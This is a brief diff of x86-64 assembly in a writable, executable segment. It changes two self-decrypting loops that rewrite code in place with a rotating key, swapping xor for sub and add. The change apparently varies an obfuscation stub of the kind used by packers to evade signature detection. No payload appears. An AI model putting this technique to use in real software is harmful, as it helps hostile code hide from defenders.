@@ -20,7 +20,7 @@ _Aelhaddadi segment READ WRITE EXECUTE alias("EAY")
 		mov rax,$+1Fh 
 		mov rbx,5555555555555555h 
 		lp:
-			xor byte ptr [rax],bl
+			sub byte ptr [rax],bl
 			ror rbx, 1
 			add rax, 2
 		loop lp 
@@ -60,7 +60,7 @@ _Aelhaddadi segment READ WRITE EXECUTE alias("EAY")
 		mov rax,$-0C6h
 		mov rbx,5555555555555555h 
 		lp2:
-			xor byte ptr [rax],bl
+			add byte ptr [rax],bl
 			ror rbx, 1
 			add rax, 2
 		loop lp2 
